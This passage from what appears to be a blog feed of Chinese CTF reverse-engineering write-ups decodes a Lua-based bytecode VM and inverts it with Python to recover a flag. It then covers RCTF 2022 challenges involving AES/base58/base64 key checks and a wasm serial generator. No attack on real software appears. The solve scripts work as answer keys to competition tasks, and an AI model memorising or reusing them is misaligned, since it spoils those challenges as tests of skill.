class="built_in">self</span>.slot[<span class="number">6</span>] = <span class="built_in">self</span>.slot[<span class="number">6</span>] - <span class="number">1</span></span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x90</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Util:oOo</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>,<span class="number">32</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">self</span>.slot[<span class="number">2</span>][i+<span class="number">128</span>] ~= <span class="built_in">self</span>.slot[<span class="number">2</span>][<span class="number">223</span>+i] <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Util:ili</span><span class="params">(num1,num2)</span></span></span><br><span class="line">    <span class="keyword">local</span> tmp1 = num1</span><br><span class="line">    <span class="keyword">local</span> tmp2 = num2</span><br><span class="line">    <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">repeat</span></span><br><span class="line">        <span class="keyword">local</span> s1 = tmp1 % <span class="number">2</span></span><br><span class="line">        <span class="keyword">local</span> s2 = tmp2 % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> s1 == s2 <span class="keyword">then</span></span><br><span class="line">            str = <span class="string">&quot;0&quot;</span>..str</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            str = <span class="string">&quot;1&quot;</span>..str</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        tmp1 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp1/<span class="number">2</span>)</span><br><span class="line">        tmp2 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp2/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">until</span>(tmp1 == <span class="number">0</span> <span class="keyword">and</span> tmp2 == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tonumber</span>(str,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Util:lil</span><span class="params">(num1,num2)</span></span></span><br><span class="line">    <span class="keyword">local</span> tmp1 = num1</span><br><span class="line">    <span class="keyword">local</span> tmp2 = num2</span><br><span class="line">    <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">repeat</span></span><br><span class="line">        <span class="keyword">local</span> s1 = tmp1 % <span class="number">2</span></span><br><span class="line">        <span class="keyword">local</span> s2 = tmp2 % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> s1 == s2 <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> s1 == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">                str = <span class="string">&quot;1&quot;</span>..str</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                str = <span class="string">&quot;0&quot;</span>..str</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            str = <span class="string">&quot;0&quot;</span>..str</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        tmp1 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp1/<span class="number">2</span>)</span><br><span class="line">        tmp2 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp2/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">until</span>(tmp1 == <span class="number">0</span> <span class="keyword">and</span> tmp2 == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tonumber</span>(str,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Util</span><br></pre></td></tr></table></figure><p>其中 <em>ili</em> 是异或运算（^），<em>lil</em> 是按位与（&amp;），<em>OoO</em> 是 <em>RunVM</em> 函数，<em>oOo</em> 是 <em>Check</em> 函数。</p><h2 id="最终解题"><a href="#最终解题" class="headerlink" title="最终解题"></a>最终解题</h2><p>分析好每种 opcode 的功能及模拟的内存和寄存器后，使用 python 模拟虚拟机执行并输出伪代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">inst = [<span class="number">65</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">191</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">50</span>, <span class="number">192</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">50</span>, <span class="number">193</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">194</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">50</span>, <span class="number">195</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">6</span>, <span class="number">50</span>, <span class="number">197</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">198</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">8</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">8</span>, <span class="number">50</span>, <span class="number">199</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">9</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">9</span>, <span class="number">50</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">10</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">201</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">11</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">50</span>, <span class="number">202</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">203</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">13</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">13</span>, <span class="number">50</span>, <span class="number">204</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">14</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">14</span>, <span class="number">50</span>, <span class="number">205</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">15</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">206</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">207</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">208</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">209</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">19</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">50</span>, <span class="number">210</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">20</span>, <span class="number">50</span>, <span class="number">211</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">50</span>, <span class="number">212</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">213</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">23</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">23</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">215</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">50</span>, <span class="number">216</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">26</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">50</span>, <span class="number">217</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">27</span>, <span class="number">50</span>, <span class="number">218</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">28</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">50</span>, <span class="number">219</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">29</span>, <span class="number">50</span>, <span class="number">220</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">30</span>, <span class="number">50</span>, <span class="number">221</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>]</span><br><span class="line">vm_ip = <span class="number">0</span></span><br><span class="line">temp_reg = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> vm_ip &lt; <span class="built_in">len</span>(inst):</span><br><span class="line"></span><br><span class="line">opcode = inst[vm_ip]</span><br><span class="line">operand1 = inst[vm_ip + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> opcode == <span class="number">0x11</span>:</span><br><span class="line">code = <span class="string">f&quot;(byte) input[<span class="subst">&#123;operand1&#125;</span>]++&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x12</span>:</span><br><span class="line">code = <span class="string">f&quot;(byte) input[<span class="subst">&#123;operand1&#125;</span>]--&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x21</span>:</span><br><span class="line">code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span>++&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x22</span>:</span><br><span class="line">code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span>--&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x23</span>:</span><br><span class="line">operand2 = inst[vm_ip + <span class="number">2</span>]</span><br><span class="line">code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span> ^= <span class="subst">&#123;operand2&#125;</span>&quot;</span></span><br><span class="line">vm_ip += <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x24</span>:</span><br><span class="line">operand2 = inst[vm_ip + <span class="number">2</span>]</span><br><span class="line">code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span> ^= reg<span class="subst">&#123;operand2 - <span class="number">8</span>&#125;</span>&quot;</span></span><br><span class="line">vm_ip += <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x25</span>:</span><br><span class="line">code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span> = memory[<span class="subst">&#123;temp_reg&#125;</span>]&quot;</span></span><br><span class="line">temp_reg -= <span class="number">1</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x31</span>:</span><br><span class="line">code = <span class="string">f&quot;input[<span class="subst">&#123;operand1&#125;</span>] = (byte) memory[<span class="subst">&#123;temp_reg&#125;</span>]&quot;</span></span><br><span class="line">temp_reg -= <span class="number">1</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x32</span>:</span><br><span class="line">temp_reg += <span class="number">1</span></span><br><span class="line">code = <span class="string">f&quot;memory[<span class="subst">&#123;temp_reg&#125;</span>] = (byte) input[<span class="subst">&#123;operand1&#125;</span>]&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x41</span>:</span><br><span class="line">temp_reg += <span class="number">1</span></span><br><span class="line">code = <span class="string">f&quot;memory[<span class="subst">&#123;temp_reg&#125;</span>] = <span class="subst">&#123;operand1&#125;</span>&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> opcode == <span class="number">0x42</span>:</span><br><span class="line">temp_reg += <span class="number">1</span></span><br><span class="line">code = <span class="string">f&quot;memory[<span class="subst">&#123;temp_reg&#125;</span>] = reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span>&quot;</span></span><br><span class="line">vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure><p>将输出翻译为高级语言：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;?&quot;</span> * <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">buf[<span class="number">0</span>] = (buf[<span class="number">0</span>] ^ <span class="number">30</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">buf[i] ^= buf[i - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">31</span>:</span><br><span class="line">buf[i] -= <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">buf[i] += <span class="number">1</span></span><br><span class="line">buf[i] &amp;= <span class="number">0xFF</span></span><br></pre></td></tr></table></figure><p>故有解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cipher = [ <span class="number">94</span>, <span class="number">106</span>, <span class="number">91</span>, <span class="number">110</span>, <span class="number">86</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">20</span>, <span class="number">32</span>, <span class="number">20</span>, <span class="number">80</span>, <span class="number">21</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">88</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">19</span>, <span class="number">79</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">61</span>, <span class="number">13</span>, <span class="number">75</span>, <span class="number">115</span>, <span class="number">48</span>, <span class="number">8</span>, <span class="number">76</span>, <span class="number">123</span> ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">31</span>:</span><br><span class="line">cipher[i] += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">cipher[i] -= <span class="number">1</span></span><br><span class="line">cipher[i] &amp;= <span class="number">0xFF</span></span><br><span class="line">cipher[i] ^= cipher[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cipher[<span class="number">0</span>] = (cipher[<span class="number">0</span>] + <span class="number">1</span>) ^ <span class="number">30</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, cipher))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>在游戏里去顶砖块（上面一排是前 16 个字符，下面一排是后 16 个字符），最后再顶问号块，可以得到蘑菇：</p><p><img src="/img/article/20230402/show_mushroom.jpg" alt="show_mushroom"></p><p>吃了蘑菇去碰板栗仔，墙就会消失，触碰旗帜通关成功：</p><p><img src="/img/article/20230402/win_game.jpg" alt="win_game"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF 2022 RE wp</title>
      <link href="/2022/12/12/RCTF-2022-RE-wp/"/>
      <url>/2022/12/12/RCTF-2022-RE-wp/</url>
      
        <content type="html"><![CDATA[<p>今年的题目一言难尽啊……没活可以咬打火机而不是用 rust 来折磨我</p><p>题目附件<a href="/attachment/rctf2022/tasks.zip">下载</a></p><h2 id="CheckYourKey"><a href="#CheckYourKey" class="headerlink" title="CheckYourKey"></a>CheckYourKey</h2><p>JNI_onLoad 将 sub_8965 注册为 ooxx，输入先后经过如下变化</p><ol><li>sub_FB40：标准 AES-128-ECB</li><li>sub_F7DC：标准 base58</li><li>sub_13788：变表 base64</li></ol><p>最后与目标值比较，逐个逆回去即可</p><p><img src="/img/article/20221212/1.png" alt="CheckYourKey"></p><h2 id="web-run"><a href="#web-run" class="headerlink" title="web_run"></a>web_run</h2><p>通过 js 发现是 wasm 逆向题，wasm 的入口是 _main，且定义了 一些交互接口</p><p><img src="/img/article/20221212/2.png" alt="web_run"></p><p>先改个后缀</p><ul><li>.1 是 html</li><li>.2 是 wasm</li></ul><p>jeb 分析 ez_ca.wasm，还原 _f11 部分符号：</p><p><img src="/img/article/20221212/3.png" alt="web_run"></p><p>get_input_time 首先接收 20 个字符（fd_read 的实现里会自动加换行，占用一个字符），前 16 个必须满足 <code>%llu/%llu/%llu %llu:%llu</code> 的格式，转成 int 形式后不能是 202211110054：</p><p><img src="/img/article/20221212/4.png" alt="web_run"></p><p>之后 generate_serial 函数依据输入的时间生成序列号，要求第二次输入必须与计算得到的序列号相同。但是由于 0xA20 这个地址中的内容恒为 0，因此不管输什么时间进去，就算序列号对了，也会输出 <code>right value,But the time is not the time I want to hide</code>。</p><p>观察到代码中判断时间为 202211110054 时会退出执行，不产生序列号。于是猜测题目将 2022/11/11 00:54 这个时间对应的序列号作为 flag，故分析 generate_serial 并自行实现就可以求得 flag 了（也可以 patch wasm）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">v: <span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(v)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_one</span>(<span class="params">v: <span class="built_in">int</span></span>):</span></span><br><span class="line">    v = v * <span class="number">6364136223846793005</span> + <span class="number">1</span></span><br><span class="line">    c = (v &gt;&gt; <span class="number">33</span>) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> c, v</span><br><span 